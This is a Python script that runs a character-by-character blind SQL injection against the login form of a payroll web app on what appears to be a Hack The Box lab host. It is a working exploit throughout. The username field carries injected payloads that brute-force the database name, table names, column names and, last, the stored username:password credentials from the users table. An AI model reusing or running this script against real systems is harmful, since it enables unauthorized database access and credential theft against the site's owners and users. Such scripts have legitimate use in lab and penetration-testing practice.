#!/usr/bin/env python3 

import sys, signal, requests, string, time

def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)


# Global
url = "http://preprod-payroll.trick.htb/ajax.php?action=login"

def getDB(): 
    database = ""
    print("\n[*] Extracting database(): ", end='')

    for p in range (1, 60):

        found_character = False

        for i in range (64,127):

            post_data = {
                "username": "test' ||(select ascii(substr(database(),%d,1))='%d')-- -" % (p, i),
                "password": "test"

            }

            r = requests.post(url, data=post_data)
           
            if "1" in r.text:
                database += chr(i)
                print(chr(i), end='')
                sys.stdout.flush()
                found_character = True

                break

        if not found_character:
            break

    return database 

def getTables(): 
    tables = ""
    print("\n[*] Extracting tables: ", end='')
    for p in range (1, 200):

        found_character = False

        for i in range (33,127):

            post_data = {
                "username": "test'||(select ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='payroll_db'),%d,1))='%d')-- -" % (p, i),
                "password": "test"

            }

            r = requests.post(url, data=post_data)
           
            if "1" in r.text:
                tables += chr(i)
                print(chr(i), end='')
                sys.stdout.flush()
                found_character = True

                break

        if not found_character:
            break

    return tables 

def getColumns(): 
    col = ""
    print("\n[*] Extracting columns: ", end='')
    for p in range (1, 200):

        found_character = False

        for i in range (33,127):

            post_data = {
                "username": "test'||(select ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='payroll_db' and table_name='employee'),%d,1))='%d')-- -" % (p, i),
                "password": "test"

            }

            r = requests.post(url, data=post_data)
           
            if "1" in r.text:
                col += chr(i)
                print(chr(i), end='')
                sys.stdout.flush()
                found_character = True

                break

        if not found_character:
            break

    return col 

def getPassword(): 
    passwd = ""
    print("\n[*] Extracting username and password: ", end='')
    for p in range (1, 200):

        found_character = False

        for i in range (33,127):

            post_data = {
                "username": "test'||(select ascii(substr((select group_concat(username,0x3a,password) from users limit 1),%d,1))='%d')-- -" % (p, i),
                "password": "test"

            }

            r = requests.post(url, data=post_data)
           
            if "1" in r.text:
                passwd += chr(i)
                print(chr(i), end='')
                sys.stdout.flush()
                found_character = True

                break

        if not found_character:
            break

    print("\n[!] Password extracted!!")

    return passwd 


signal.signal(signal.SIGINT, def_handler)


if __name__ == '__main__':
    #db = getDB()
    #tables = getTables()
    #columns = getColumns()
    password = getPassword()
